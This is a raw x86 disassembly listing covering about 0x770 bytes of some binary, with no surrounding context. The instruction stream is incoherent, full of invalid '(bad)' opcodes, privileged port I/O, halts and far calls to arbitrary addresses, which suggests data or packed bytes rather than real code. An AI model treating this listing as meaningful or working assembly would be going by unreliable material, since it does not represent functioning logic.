  40e80d:	(bad)  
  40e80e:	sbb    BYTE PTR [ebx-0x49dc2d35],dh
  40e814:	mov    esp,0xc6e66f4a
  40e819:	mov    ecx,gs
  40e81b:	sbb    DWORD PTR [esi+0x641aa199],edx
  40e821:	mov    esi,ebx
  40e823:	mov    dl,0x8a
  40e825:	in     al,dx
  40e826:	mov    ds:0x693bea3c,eax
  40e82b:	sub    al,0x3e
  40e82d:	leave  
  40e82e:	pop    es
  40e82f:	mov    ah,0x30
  40e831:	add    DWORD PTR [ebp-0x37],edx
  40e834:	gs ins DWORD PTR es:[edi],dx
  40e836:	dec    eax
  40e837:	mov    WORD PTR [esi-0x6ad58a21],ds
  40e83d:	sub    esp,ebx
  40e83f:	push   eax
  40e840:	call   0x784d:0x7cae66f9
  40e847:	pop    edi
  40e848:	ins    DWORD PTR es:[edi],dx
  40e849:	push   0x88bad5c4
  40e84e:	pusha  
  40e84f:	and    dl,BYTE PTR [eax+0x65b1b905]
  40e855:	sbb    esp,DWORD PTR [esi]
  40e857:	int3   
  40e858:	es jnp 0x40e865
  40e85b:	jae    0x40e83f
  40e85d:	and    cl,BYTE PTR [eax-0x2c30ddd6]
  40e863:	pop    ebx
  40e864:	repnz cld 
  40e866:	stc    
  40e867:	sub    BYTE PTR [ebx+0x58b38d77],ch
  40e86d:	push   edi
  40e86e:	pop    edi
  40e86f:	xor    cl,BYTE PTR es:[edi+0x1090ecf6]
  40e876:	aam    0xf7
  40e878:	ins    BYTE PTR es:[edi],dx
  40e879:	sahf   
  40e87a:	or     dl,BYTE PTR [eax+esi*1-0x3]
  40e87e:	std    
  40e87f:	jp     0x40e834
  40e881:	pop    esp
  40e882:	shr    BYTE PTR [edx+edi*1+0x5e740dc0],cl
  40e889:	mov    ch,0x6a
  40e88b:	adc    al,0x8e
  40e88d:	push   ebp
  40e88e:	dec    esp
  40e88f:	and    DWORD PTR [esi-0x61d05ae2],0xffffffe1
  40e896:	es jns 0x40e87a
  40e899:	stos   DWORD PTR es:[edi],eax
  40e89a:	dec    edx
  40e89b:	add    eax,0xfc8d8c7
  40e8a0:	dec    ecx
  40e8a1:	daa    
  40e8a2:	outs   dx,BYTE PTR ds:[esi]
  40e8a3:	mov    ch,0xaa
  40e8a5:	jmp    DWORD PTR [esp+eax*8+0x65]
  40e8a9:	xor    ah,ch
  40e8ab:	push   esi
  40e8ac:	xchg   ecx,eax
  40e8ad:	bound  eax,QWORD PTR [edx]
  40e8af:	imul   ecx,DWORD PTR [eax+ecx*4+0x3507412a],0x94814f
  40e8ba:	add    BYTE PTR [eax],al
  40e8bc:	add    BYTE PTR [eax],al
  40e8be:	add    BYTE PTR [eax+0x34],ch
  40e8c1:	fs mov esi,0xf6fafe7c
  40e8c7:	mov    bl,0x9d
  40e8c9:	aam    0xd4
  40e8cb:	mov    dl,0xff
  40e8cd:	sbb    dh,BYTE PTR [ecx+0xefc5]
  40e8d3:	and    al,BYTE PTR [edi]
  40e8d5:	add    BYTE PTR [eax],al
  40e8d7:	sbb    DWORD PTR [ebx+0x329a4276],edx
  40e8dd:	jmp    0x26094b19
  40e8e2:	scas   eax,DWORD PTR es:[edi]
  40e8e3:	mov    ch,0x10
  40e8e5:	xchg   ebp,eax
  40e8e6:	cmc    
  40e8e7:	aas    
  40e8e8:	sub    al,0xd1
  40e8ea:	jo     0x40e889
  40e8ec:	and    eax,0xefca583b
  40e8f1:	stos   BYTE PTR es:[edi],al
  40e8f2:	mov    DWORD PTR [edi],edi
  40e8f4:	xor    bl,0x69
  40e8f7:	mov    ebp,0xd0c83b5c
  40e8fc:	jae    0x40e918
  40e8fe:	fadd   QWORD PTR [edx+0x40]
  40e901:	pop    es
  40e902:	xor    DWORD PTR [ebx-0x62],edi
  40e905:	mov    edi,0x7f2e7c0b
  40e90a:	inc    esi
  40e90b:	je     0x40e8b8
  40e90d:	aad    0x9
  40e90f:	mov    ch,0x48
  40e911:	mov    bl,0x1c
  40e913:	gs repnz repz mov ebx,0x870373a
  40e91b:	add    al,0xfd
  40e91d:	daa    
  40e91e:	add    ah,BYTE PTR [ebp-0x2b]
  40e921:	popf   
  40e922:	mov    ah,0x7e
  40e924:	mov    WORD PTR [eax+0x29aa2058],?
  40e92a:	jne    0x40e969
  40e92c:	ss in  al,dx
  40e92e:	inc    ebx
  40e92f:	stc    
  40e930:	mov    ecx,0xc4e79304
  40e935:	mov    ebp,0x593d2f14
  40e93a:	hlt    
  40e93b:	push   ebp
  40e93c:	icebp  
  40e93d:	pop    esi
  40e93e:	lds    edi,FWORD PTR [ebp-0x7c]
  40e941:	mov    WORD PTR [ebx-0x7b],es
  40e944:	mov    ch,0xba
  40e946:	cmc    
  40e947:	fstp   st(5)
  40e949:	iret   
  40e94a:	xchg   edi,eax
  40e94b:	jle    0x40e8f9
  40e94d:	cmp    BYTE PTR [ebx+edx*1-0x47],0x3
  40e952:	mov    WORD PTR [esi+edi*4-0x5ed6db7d],?
  40e959:	rcl    ecx,1
  40e95b:	dec    edx
  40e95c:	mov    BYTE PTR [ebx-0x62],0xcc
  40e960:	inc    esp
  40e961:	ins    DWORD PTR es:[edi],dx
  40e962:	push   esi
  40e963:	xchg   BYTE PTR [eax-0x384485ed],ah
  40e969:	cmp    cl,dl
  40e96b:	sahf   
  40e96c:	cmc    
  40e96d:	ins    BYTE PTR es:[edi],dx
  40e96e:	or     ah,ch
  40e970:	retf   0x3da6
  40e973:	jns    0x40e9c0
  40e975:	imul   edi,ebp,0x69
  40e978:	or     al,0xe2
  40e97a:	push   edi
  40e97b:	mov    ds:0xa8466551,al
  40e980:	neg    DWORD PTR [eax-0x72]
  40e983:	sbb    al,ah
  40e985:	push   cs
  40e986:	xor    eax,0x8d2e18a0
  40e98b:	mov    ecx,cs
  40e98d:	pop    es
  40e98e:	inc    BYTE PTR [edi-0x59]
  40e991:	sbb    ecx,DWORD PTR [eax+eiz*8]
  40e994:	sbb    DWORD PTR [esi+esi*4],ebp
  40e997:	enter  0x66cb,0x20
  40e99b:	(bad)
  40e99e:	imul   esi,DWORD PTR [eax+0x7d],0x18
  40e9a2:	jbe    0x40e9fe
  40e9a4:	icebp  
  40e9a5:	lock jl 0x40e982
  40e9a8:	sahf   
  40e9a9:	test   al,0x3b
  40e9ab:	mov    dh,0xc6
  40e9ad:	js     0x40e964
  40e9af:	xchg   ecx,eax
  40e9b0:	xlat   BYTE PTR ds:[ebx]
  40e9b1:	pop    ebp
  40e9b2:	pop    eax
  40e9b3:	adc    al,0xf1
  40e9b5:	out    0x66,al
  40e9b7:	retf   0x889d
  40e9ba:	or     eax,0x766e2337
  40e9bf:	dec    ebp
  40e9c0:	inc    eax
  40e9c1:	dec    ebp
  40e9c2:	daa    
  40e9c3:	jae    0x40e970
  40e9c5:	add    DWORD PTR ds:0x3fa018dd,edi
  40e9cb:	mov    ch,0xd
  40e9cd:	adc    al,0xce
  40e9cf:	popa   
  40e9d0:	cmp    DWORD PTR [ecx],ebp
  40e9d2:	xchg   DWORD PTR [ecx],esp
  40e9d4:	scas   al,BYTE PTR es:[edi]
  40e9d5:	sub    DWORD PTR [ecx+0x2c],ecx
  40e9d8:	inc    eax
  40e9d9:	lahf   
  40e9da:	rcl    DWORD PTR [esi],0x2f
  40e9dd:	gs out dx,al
  40e9df:	cmp    bh,BYTE PTR [edx+0x396934c6]
  40e9e5:	cmp    ebx,DWORD PTR [ecx+eax*8-0x4d]
  40e9e9:	out    dx,al
  40e9ea:	dec    ebx
  40e9eb:	inc    ecx
  40e9ec:	std    
  40e9ed:	add    DWORD PTR [edx+0x6c],ebp
  40e9f0:	add    edx,DWORD PTR [ebp-0x3b]
  40e9f3:	ret    0x33b0
  40e9f6:	daa    
  40e9f7:	icebp  
  40e9f8:	das    
  40e9f9:	mov    WORD PTR [ebx+eiz*8],?
  40e9fc:	popf   
  40e9fd:	lods   eax,DWORD PTR ds:[esi]
  40e9fe:	icebp  
  40e9ff:	push   esp
  40ea00:	xor    eax,0x9607cfc8
  40ea05:	jp     0x40e99b
  40ea07:	scas   al,BYTE PTR es:[edi]
  40ea08:	xor    dl,ch
  40ea0a:	adc    BYTE PTR [esi-0x3d8eaa8f],dh
  40ea10:	sub    cl,ch
  40ea12:	and    bl,bl
  40ea14:	rcl    cl,0xa
  40ea17:	push   0xffffffbb
  40ea19:	ficom  DWORD PTR [ecx+0x20]
  40ea1c:	out    dx,eax
  40ea1d:	dec    esi
  40ea1e:	cmp    eax,0x538b8904
  40ea23:	or     BYTE PTR cs:[ebx+0x28],bl
  40ea27:	pop    esi
  40ea28:	bound  edi,QWORD PTR [edi+0x7b]
  40ea2b:	sbb    edx,DWORD PTR [eax]
  40ea2d:	ud2    
  40ea2f:	adc    ebx,ecx
  40ea31:	out    dx,eax
  40ea32:	xchg   esp,eax
  40ea33:	add    DWORD PTR [esi+0x7a72ed28],ebp
  40ea39:	(bad)  
  40ea3a:	jae    0x40ea1f
  40ea3c:	jmp    0x9bec3583
  40ea41:	fs mov bh,0x5d
  40ea44:	jne    0x40ea80
  40ea46:	imul   ebp,DWORD PTR [ebx-0x54],0xffffff91
  40ea4a:	jl     0x40ea2a
  40ea4c:	fwait
  40ea4d:	xchg   DWORD PTR [eax-0x10],ebp
  40ea50:	ret    
  40ea51:	nop
  40ea52:	outs   dx,BYTE PTR ds:[esi]
  40ea53:	hlt    
  40ea54:	clc    
  40ea55:	pop    ebx
  40ea56:	(bad)  
  40ea57:	icebp  
  40ea58:	test   DWORD PTR [edi+0x75465124],ebx
  40ea5e:	xchg   DWORD PTR [ecx-0x6b],ebx
  40ea61:	push   ds
  40ea62:	pushf  
  40ea63:	mov    eax,ds:0xccf25d3d
  40ea68:	sub    ch,BYTE PTR [eax-0xa953e42]
  40ea6e:	shl    ecx,cl
  40ea70:	imul   ecx,DWORD PTR [esi+0x2a],0x41
  40ea74:	mov    esi,0x57a7eea3
  40ea79:	cmp    al,0xce
  40ea7b:	mov    dl,0x3c
  40ea7d:	pop    eax
  40ea7e:	cdq    
  40ea7f:	inc    eax
  40ea80:	sbb    al,0x60
  40ea82:	sar    ah,1
  40ea84:	inc    edi
  40ea85:	pop    ss
  40ea86:	test   al,0x64
  40ea88:	add    esp,DWORD PTR [esi-0x43]
  40ea8b:	rcl    DWORD PTR [eax-0x49],cl
  40ea8e:	push   ebx
  40ea8f:	leave  
  40ea90:	(bad)  
  40ea92:	outs   dx,DWORD PTR ds:[esi]
  40ea93:	mov    esp,0x2c144f0e
  40ea98:	pop    eax
  40ea99:	xchg   ecx,eax
  40ea9a:	mov    esi,0x3b2d4a99
  40ea9f:	sbb    ecx,esp
  40eaa1:	fstp   QWORD PTR [ecx-0x9e3b196]
  40eaa7:	push   ds
  40eaa8:	in     al,0x10
  40eaaa:	adc    DWORD PTR [esi+ebx*4-0x2b07531],eax
  40eab1:	sub    al,0x58
  40eab3:	inc    ebx
  40eab4:	repz jl 0x40eae1
  40eab7:	xchg   esp,eax
  40eab8:	imul   ebx,eax,0xfffffff4
  40eabb:	out    0x48,eax
  40eabd:	or     cx,bp
  40eac0:	mov    ebx,DWORD PTR [edi-0x739ab30]
  40eac6:	loopne 0x40ea9d
  40eac8:	push   ds
  40eac9:	inc    ecx
  40eaca:	mov    eax,0x5b5e4218
  40eacf:	shr    BYTE PTR [esi],1
  40ead1:	add    al,0xd0
  40ead3:	mov    edi,0xcceaf71a
  40ead8:	jmp    0xcfe4d809
  40eadd:	cmp    esp,edx
  40eadf:	sub    eax,DWORD PTR [esi-0xa]
  40eae2:	mov    ah,0x25
  40eae4:	scas   eax,DWORD PTR es:[edi]
  40eae5:	into   
  40eae6:	shl    DWORD PTR [esi+0x78],1
  40eae9:	dec    eax
  40eaea:	jle    0x40ea9c
  40eaec:	int3   
  40eaed:	adc    DWORD PTR [esi-0x72],esp
  40eaf0:	das    
  40eaf1:	sub    eax,0x6010c43f
  40eaf6:	or     DWORD PTR [edx-0x10de8bd7],eax
  40eafc:	lea    esp,[ebx]
  40eafe:	pop    ss
  40eaff:	add    DWORD PTR [ecx+0x2cd4fab1],0x6eeb3ab9
  40eb09:	adc    DWORD PTR [edx-0x42],eax
  40eb0c:	ror    DWORD PTR [edx],cl
  40eb0e:	call   0x23e4:0x91500c4e
  40eb15:	mov    cl,0xec
  40eb17:	imul   eax,DWORD PTR [eax],0xc6407bea
  40eb1d:	mov    ds:0xe80467b5,eax
  40eb22:	call   edi
  40eb24:	pop    ebp
  40eb25:	xor    ecx,0xffffffbc
  40eb28:	das    
  40eb29:	mov    dl,0x5a
  40eb2b:	sbb    bh,BYTE PTR [ecx+0x16a30a20]
  40eb31:	test   al,0x52
  40eb33:	adc    eax,DWORD PTR ds:0xa746c41c
  40eb39:	and    eax,0x386bc780
  40eb3e:	test   DWORD PTR [ecx+0x12],ebp
  40eb41:	adc    BYTE PTR [ebp+0x117be4f2],ah
  40eb47:	mov    al,ds:0x6ec5a834
  40eb4c:	xchg   esi,eax
  40eb4d:	cmp    BYTE PTR [esi+0x1c676df3],bl
  40eb53:	js     0x40ebcd
  40eb55:	(bad)
  40eb58:	je     0x40eb5a
  40eb5a:	das    
  40eb5b:	xor    al,0x4f
  40eb5d:	adc    eax,0xc29eb1aa
  40eb62:	sbb    DWORD PTR [edx+0x54],ebp
  40eb65:	mov    edx,0x99eb1861
  40eb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb6b:	addr16 push ecx
  40eb6d:	lock retf 
  40eb6f:	adc    eax,0xd3711e6e
  40eb74:	inc    ebp
  40eb75:	cmp    ecx,esp
  40eb77:	pop    es
  40eb78:	popa   
  40eb79:	mov    BYTE PTR [ecx+ecx*1-0x341b172b],cl
  40eb80:	outs   dx,BYTE PTR ds:[esi]
  40eb81:	fdivr  QWORD PTR [esp+ebp*1]
  40eb84:	movntps XMMWORD PTR [ebp+0x49],xmm0
  40eb88:	imul   ebx,DWORD PTR [edi-0x51],0xc
  40eb8c:	and    DWORD PTR [ebx+0x4b],0x46
  40eb90:	mov    dh,0x83
  40eb92:	jg     0x40eb2d
  40eb94:	test   DWORD PTR [edi+eax*4+0x1159bd25],ecx
  40eb9b:	xor    DWORD PTR [edx],0xa534d535
  40eba1:	dec    ecx
  40eba2:	xchg   DWORD PTR [ebp+0x69],eax
  40eba5:	adc    al,0x5c
  40eba7:	or     eax,0xed9d68d7
  40ebac:	pop    es
  40ebad:	pop    edi
  40ebae:	jp     0x40eb9f
  40ebb0:	loop   0x40ec23
  40ebb2:	mov    ds:0x7b8ba47a,eax
  40ebb7:	outs   dx,BYTE PTR ds:[esi]
  40ebb8:	mov    bl,bh
  40ebba:	adc    ah,BYTE PTR [ecx+eiz*8]
  40ebbd:	je     0x40ebcc
  40ebbf:	push   cs
  40ebc0:	adc    esp,edi
  40ebc2:	cmc    
  40ebc3:	mov    eax,ds:0xb2cc387
  40ebc8:	mov    DWORD PTR [esi+0x20c89139],ecx
  40ebce:	fdiv   DWORD PTR [eax-0x59]
  40ebd1:	fwait
  40ebd2:	mov    dl,bh
  40ebd4:	out    0x49,eax
  40ebd6:	push   es
  40ebd7:	sbb    al,0x38
  40ebd9:	mov    DWORD PTR [edx+0x10],ecx
  40ebdc:	cmp    eax,0xc375abf3
  40ebe1:	or     cl,BYTE PTR [edi-0x44ba3584]
  40ebe7:	xchg   edx,eax
  40ebe8:	repz pop esi
  40ebea:	test   eax,0xa844677a
  40ebef:	pop    esp
  40ebf0:	mov    WORD PTR [esi-0x65],ds
  40ebf3:	inc    ebx
  40ebf4:	lahf   
  40ebf5:	mov    WORD PTR [ebx],?
  40ebf7:	or     BYTE PTR ds:0x1a7db3e8,0xa9
  40ebfe:	and    edi,esi
  40ec00:	dec    esi
  40ec01:	inc    edi
  40ec02:	xchg   ebx,eax
  40ec03:	std    
  40ec04:	mov    dh,0xd0
  40ec06:	daa    
  40ec07:	ret    
  40ec08:	mov    ch,0xe9
  40ec0a:	sbb    esp,edi
  40ec0c:	fisttp DWORD PTR [ecx]
  40ec0f:	nop
  40ec10:	inc    ebp
  40ec12:	mov    ah,0x9e
  40ec14:	or     esi,DWORD PTR [esi-0x2bfdfef6]
  40ec1a:	ret    
  40ec1b:	cmp    esi,DWORD PTR [ebx-0x30c02086]
  40ec21:	add    edi,ecx
  40ec23:	scas   al,BYTE PTR es:[edi]
  40ec24:	daa    
  40ec25:	xchg   ebp,eax
  40ec26:	push   edx
  40ec27:	imul   DWORD PTR [edx+ebx*1-0x68ec9c9]
  40ec2e:	cmp    ecx,ebx
  40ec30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec31:	cli    
  40ec32:	inc    esi
  40ec33:	arpl   WORD PTR [ebp-0x19],si
  40ec36:	mov    cl,cl
  40ec38:	clc    
  40ec39:	xor    edx,DWORD PTR [esi]
  40ec3b:	loop   0x40ec3b
  40ec3d:	rol    BYTE PTR [edi-0x465edb80],cl
  40ec43:	movaps xmm7,xmm3
  40ec46:	aas    
  40ec47:	ins    DWORD PTR es:[edi],dx
  40ec48:	lea    edx,[ebp-0x1d]
  40ec4b:	in     al,0xbc
  40ec4d:	arpl   WORD PTR [ecx-0x28df8d9b],di
  40ec53:	xchg   ebx,eax
  40ec54:	shl    BYTE PTR [ebx+0x4341d906],0x42
  40ec5b:	data16 jmp 0x40ec8d
  40ec5e:	test   dh,al
  40ec60:	jle    0x40ecbd
  40ec62:	test   al,0x29
  40ec64:	mov    ebx,?
  40ec66:	xor    ecx,DWORD PTR [ebx]
  40ec68:	push   eax
  40ec69:	scas   al,BYTE PTR es:[edi]
  40ec6a:	sub    DWORD PTR ds:[esi],edx
  40ec6d:	retf   
  40ec6e:	call   0x39937789
  40ec73:	and    edi,DWORD PTR [ecx+esi*4]
  40ec76:	ins    BYTE PTR es:[edi],dx
  40ec77:	or     eax,0xf6870e8e
  40ec7c:	(bad)  
  40ec7d:	(bad)
  40ec80:	sub    al,0xa8
  40ec82:	pusha  
  40ec83:	inc    DWORD PTR [ebx+0xca76379]
  40ec89:	ss xor dh,ch
  40ec8c:	imul   esi,DWORD PTR [edi],0x57fe743e
  40ec92:	xchg   edx,eax
  40ec93:	mov    eax,ds:0xdec3d934
  40ec98:	scas   al,BYTE PTR es:[edi]
  40ec99:	ss mov ebp,0x2a75ff9c
  40ec9f:	and    al,0x6f
  40eca1:	test   al,0xe9
  40eca3:	and    BYTE PTR [esi-0x533d6f],dl
  40eca9:	xabort 0x2
  40ecac:	leave  
  40ecad:	stc    
  40ecae:	dec    ebx
  40ecaf:	mov    esi,0x2ae4663f
  40ecb4:	scas   al,BYTE PTR es:[edi]
  40ecb5:	call   0x3d2f:0xb43c9930
  40ecbc:	pop    ss
  40ecbd:	cs mov edx,0x45f64359
  40ecc3:	loop   0x40ed23
  40ecc5:	pop    ds
  40ecc6:	sar    DWORD PTR [edx+0x13a7876f],cl
  40eccc:	xor    dl,BYTE PTR [ebx-0x3c]
  40eccf:	imul   DWORD PTR [ebx+0x76]
  40ecd2:	jae    0x40ed32
  40ecd4:	sub    al,0x6f
  40ecd6:	call   DWORD PTR [edi+0xb6d0275]
  40ecdc:	add    al,0xc
  40ecde:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ece0:	scas   al,BYTE PTR es:[edi]
  40ece1:	sub    al,0x44
  40ece3:	cwde   
  40ece4:	pop    ss
  40ece5:	imul   ebx,DWORD PTR [esp+eiz*4-0x1dd4708c],0x1246431a
  40ecf0:	sub    eax,0x9877b77a
  40ecf5:	repnz add al,0xb
  40ecf8:	or     cl,ch
  40ecfa:	mov    esi,0xa20b0452
  40ecff:	leave  
  40ed00:	cdq    
  40ed01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed02:	jne    0x40ed62
  40ed04:	popf   
  40ed05:	gs jge 0x40ed64
  40ed08:	sbb    BYTE PTR [esi-0x2215ac89],0xe6
  40ed0f:	mov    ebx,0x4d5bee73
  40ed14:	push   cs
  40ed15:	je     0x40eccf
  40ed17:	cmp    bh,dl
  40ed19:	add    eax,0x12fb24ec
  40ed1e:	lods   eax,DWORD PTR ds:[esi]
  40ed1f:	bnd jae 0x40ed49
  40ed22:	mov    al,0xf1
  40ed24:	test   ch,dh
  40ed26:	push   es
  40ed27:	hlt    
  40ed28:	or     DWORD PTR [eax+0x3d],ecx
  40ed2b:	outs   dx,DWORD PTR ds:[esi]
  40ed2c:	jecxz  0x40ecd3
  40ed2e:	xor    eax,0x70fc6682
  40ed33:	sub    DWORD PTR [esi+0x24e2e92b],0x58d884f6
  40ed3d:	jnp    0x40ed1e
  40ed3f:	jnp    0x40edc0
  40ed41:	ds popf 
  40ed43:	push   esi
  40ed44:	repz sbb DWORD PTR [ecx-0x5641ce31],ebx
  40ed4b:	pop    ds
  40ed4c:	jnp    0x40ed4f
  40ed4e:	or     ax,WORD PTR [esi+0x13]
  40ed52:	sbb    cl,0xc0
  40ed55:	or     DWORD PTR [ebx],ebx
  40ed57:	mov    ebx,esp
  40ed59:	mov    bl,0xde
  40ed5b:	or     bh,BYTE PTR [ebp+0x21]
  40ed5e:	sbb    ecx,ebx
  40ed60:	in     eax,0xca
  40ed62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed63:	xor    bl,al
  40ed65:	adc    DWORD PTR [edi+0x42],edi
  40ed68:	(bad)  
  40ed69:	mov    eax,0xb5e75da0
  40ed6e:	lods   eax,DWORD PTR ds:[esi]
  40ed6f:	(bad)  
  40ed70:	xlat   BYTE PTR ds:[ebx]
  40ed71:	nop
  40ed72:	popa   
  40ed73:	data16 (bad) 
  40ed76:	test   al,0x7c
  40ed78:	and    DWORD PTR [edx-0x64],ebx
  40ed7b:	push   ebp
  40ed7c:	mov    al,ds:0x2ccbed96
  40ed81:	icebp  
  40ed82:	rcr    edi,cl
  40ed84:	xchg   esp,eax
  40ed85:	pop    es
  40ed86:	jno    0x40ed0e
  40ed88:	addr16 pop ecx
  40ed8a:	in     eax,dx
  40ed8b:	dec    edx
  40ed8c:	sbb    al,0x2b
  40ed8e:	dec    esp
  40ed8f:	mov    eax,ds:0x3d592ae1
  40ed94:	test   DWORD PTR [eax],esi
  40ed96:	jno    0x40ede5
  40ed98:	xchg   dh,bh
  40ed9a:	call   0x393a3559
  40ed9f:	ins    DWORD PTR es:[edi],dx
  40eda0:	inc    edx
  40eda1:	jmp    0x6e97c3ba
  40eda6:	pop    edx
  40eda7:	xor    ebx,DWORD PTR [esi]
  40eda9:	jbe    0x40edb8
  40edab:	pop    ebp
  40edac:	stc    
  40edad:	push   cs
  40edae:	mov    edx,0x14e0cf8d
  40edb3:	adc    al,0xbe
  40edb5:	in     al,0xe7
  40edb7:	mov    cl,0xcb
  40edb9:	cmp    al,0xea
  40edbb:	out    dx,eax
  40edbc:	xor    eax,0xb8641fc0
  40edc1:	dec    edi
  40edc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc3:	imul   ecx,DWORD PTR [edx],0xffffff9c
  40edc6:	fsubr  QWORD PTR [ebx-0x5]
  40edc9:	jg     0x40edc0
  40edcb:	or     eax,0x514eef7b
  40edd0:	xor    eax,0xeef20f9f
  40edd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd6:	mov    esp,0xebfae847
  40eddb:	fisttp WORD PTR [ecx+0x4c]
  40edde:	jns    0x40ee21
  40ede0:	lock idiv BYTE PTR [esi+0x3c]
  40ede4:	pop    ds
  40ede5:	sbb    bh,BYTE PTR [ebx+0x8]
  40ede8:	fwait
  40ede9:	push   ebx
  40edea:	add    DWORD PTR [eax],edx
  40edec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eded:	xor    al,0xa
  40edef:	xchg   BYTE PTR [edi],bl
  40edf1:	pop    ebx
  40edf2:	xchg   DWORD PTR [ecx+0x5987e919],eax
  40edf8:	mov    es,WORD PTR [ecx+ebx*8]
  40edfb:	cmovge esi,DWORD PTR [edi+0x4c]
  40edff:	pop    edi
  40ee00:	aam    0xe7
  40ee02:	mov    cl,dl
  40ee04:	push   0xb179a341
  40ee09:	pop    esp
  40ee0a:	shl    DWORD PTR [ebp-0x64],0xf1
  40ee0e:	sbb    eax,0xf8961480
  40ee13:	xchg   esp,eax
  40ee14:	test   DWORD PTR [esi-0x568bc1fc],ebx
  40ee1a:	mov    BYTE PTR [edi],al
  40ee1c:	pop    edx
  40ee1d:	mov    bh,0x74
  40ee1f:	mov    ecx,0x4c39193d
  40ee24:	les    edi,FWORD PTR [ecx]
  40ee26:	imul   ebx
  40ee28:	ins    BYTE PTR es:[edi],dx
  40ee29:	or     bh,BYTE PTR [esi+0x15]
  40ee2c:	ror    DWORD PTR [ebx],cl
  40ee2e:	je     0x40ee0b
  40ee30:	in     eax,dx
  40ee31:	adc    DWORD PTR [edx+ebx*1+0x15],edx
  40ee35:	stos   BYTE PTR es:[edi],al
  40ee36:	sub    DWORD PTR [ebp+eax*2+0x2a],ebp
  40ee3a:	out    0x19,al
  40ee3c:	(bad)  
  40ee3d:	outs   dx,BYTE PTR ds:[esi]
  40ee3e:	into   
  40ee3f:	sub    eax,0xcd6ea8f6
  40ee44:	push   ebx
  40ee45:	or     DWORD PTR ds:0x772cf652,esi
  40ee4b:	cs jb  0x40ee92
  40ee4e:	loopne 0x40ee5d
  40ee50:	add    esp,ebp
  40ee52:	push   eax
  40ee53:	fmul   QWORD PTR [eax+0x65]
  40ee56:	or     edx,DWORD PTR [edi]
  40ee58:	inc    cx
  40ee5a:	mov    ecx,0xfaa52433
  40ee5f:	add    al,BYTE PTR [eax-0x447ecc05]
  40ee65:	ror    DWORD PTR [esi+0x1f],0x67
  40ee69:	aaa    
  40ee6a:	aas    
  40ee6b:	mov    eax,ds:0x3e854853
  40ee70:	cwde   
  40ee71:	mov    ds:0xfb105b97,eax
  40ee76:	dec    esp
  40ee77:	mov    ecx,0xf1e4f441
  40ee7c:	cmp    ch,BYTE PTR [esi+esi*8-0x2edba1ac]
  40ee83:	mov    BYTE PTR [eax-0xfcb9c9e],al
  40ee89:	test   bl,ah
  40ee8b:	int    0xa8
  40ee8d:	out    0xe8,al
  40ee8f:	jg     0x40ee24
  40ee91:	jmp    DWORD PTR [eax]
  40ee93:	in     eax,dx
  40ee94:	xlat   BYTE PTR ds:[ebx]
  40ee95:	enter  0x673,0x15
  40ee99:	mov    ecx,0x572a1ff3
  40ee9e:	loope  0x40ef19
  40eea0:	jno    0x40eec6
  40eea2:	jo     0x40ef17
  40eea4:	test   BYTE PTR [ecx],bh
  40eea6:	je     0x40eebe
  40eea8:	js     0x40eeb5
  40eeaa:	jecxz  0x40ee9f
  40eeac:	and    BYTE PTR [edx-0x66],cl
  40eeaf:	mov    WORD PTR [ebx-0x770b3fb2],gs
  40eeb5:	sbb    esp,DWORD PTR [esi-0x2ea2f8c6]
  40eebb:	xor    al,0x78
  40eebd:	pop    edx
  40eebe:	lock mov esi,0xfb2eacd1
  40eec4:	mov    esi,0x49d0e384
  40eec9:	jbe    0x40ef27
  40eecb:	push   ss
  40eecc:	mov    ebx,0x70a4aece
  40eed1:	sub    eax,0x896041e
  40eed6:	pop    ebp
  40eed7:	cs das 
  40eed9:	xchg   esi,eax
  40eeda:	mov    dl,BYTE PTR [edi+0x3]
  40eedd:	sbb    BYTE PTR [edx+0xb],dl
  40eee0:	jo     0x40eecd
  40eee2:	add    ecx,esp
  40eee4:	loop   0x40eebc
  40eee6:	in     eax,dx
  40eee7:	add    BYTE PTR [eax+edi*8],bh
  40eeea:	std    
  40eeeb:	mov    dh,0xfc
  40eeed:	xor    ebx,esp
  40eeef:	add    al,ah
  40eef1:	add    ebp,DWORD PTR [edi+0x56a51dab]
  40eef7:	aad    0xee
  40eef9:	stc    
  40eefa:	stos   BYTE PTR es:[edi],al
  40eefb:	test   BYTE PTR [edi+0x6a],ah
  40eefe:	icebp  
  40eeff:	mov    bh,0xe9
  40ef01:	add    cl,cl
  40ef03:	retf   0x718f
  40ef06:	fmul   QWORD PTR [edi]
  40ef08:	dec    ebp
  40ef09:	adc    BYTE PTR [ecx+edx*4],cl
  40ef0c:	dec    BYTE PTR [edx+0x5b]
  40ef0f:	pop    ss
  40ef10:	mov    esp,0xba1f2aa
  40ef15:	jl     0x40eeae
  40ef17:	mov    BYTE PTR [edi],dh
  40ef19:	imul   BYTE PTR [ecx+0x331be34b]
  40ef1f:	cld    
  40ef20:	mov    esp,DWORD PTR [ebp+0x52]
  40ef23:	mov    ds:0x4689d38c,al
  40ef28:	ret    
  40ef29:	dec    edx
  40ef2a:	and    edx,eax
  40ef2c:	std    
  40ef2d:	es in  al,dx
  40ef2f:	add    eax,0xc83949e3
  40ef34:	(bad)  
  40ef35:	iret   
  40ef36:	fld    QWORD PTR [edi]
  40ef38:	(bad)  
  40ef39:	aam    0xe1
  40ef3b:	enter  0x578a,0xc1
  40ef3f:	jae    0x40ef00
  40ef41:	add    BYTE PTR [edx+esi*2+0x2d],cl
  40ef45:	mov    BYTE PTR [ebx],al
  40ef47:	push   esi
  40ef48:	adc    dl,BYTE PTR [edi+0x2ce3d8e0]
  40ef4e:	pop    eax
  40ef4f:	aas    
  40ef50:	sub    dl,bh
  40ef52:	adc    eax,0x94795c04
  40ef57:	rol    esi,0x53
  40ef5a:	call   0x1611:0xf5b17e56
  40ef61:	js     0x40ef41
  40ef63:	or     DWORD PTR [esi-0x41],eax
  40ef66:	nop    DWORD PTR [eax+0x2d5a3a0b]
  40ef6d:	loop   0x40ef5c
  40ef6f:	in     al,0xb
  40ef71:	ror    BYTE PTR [eax-0x4f],0xaf
  40ef75:	mov    edx,0xcdb1b053
  40ef7a:	sbb    al,0xe9
  40ef7c:	repz sub al,0x87
  40ef7f:	(bad)  
